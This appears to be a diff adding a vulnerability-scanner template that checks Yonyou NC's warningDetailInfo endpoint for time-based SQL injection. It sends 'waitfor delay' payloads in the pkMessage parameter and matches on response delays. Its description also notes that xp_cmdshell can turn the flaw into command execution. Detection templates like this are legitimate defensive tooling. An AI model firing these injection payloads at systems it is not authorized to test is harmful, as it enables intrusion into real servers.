@@ -1,0 +1,42 @@
+id: yonyou-NC-warningDetailInfo-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 用友NC /ebvp/infopub/warningDetailInfo接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-warningDetailInfo%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /ebvp/infopub/warningDetailInfo?pageId=login&pkMessage=1'waitfor+delay+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+      - |-
+        GET /ebvp/infopub/warningDetailInfo?pageId=login&pkMessage=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+      - |-
+        GET /ebvp/infopub/warningDetailInfo?pageId=login&pkMessage=1'waitfor+delay+'0:0:9'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
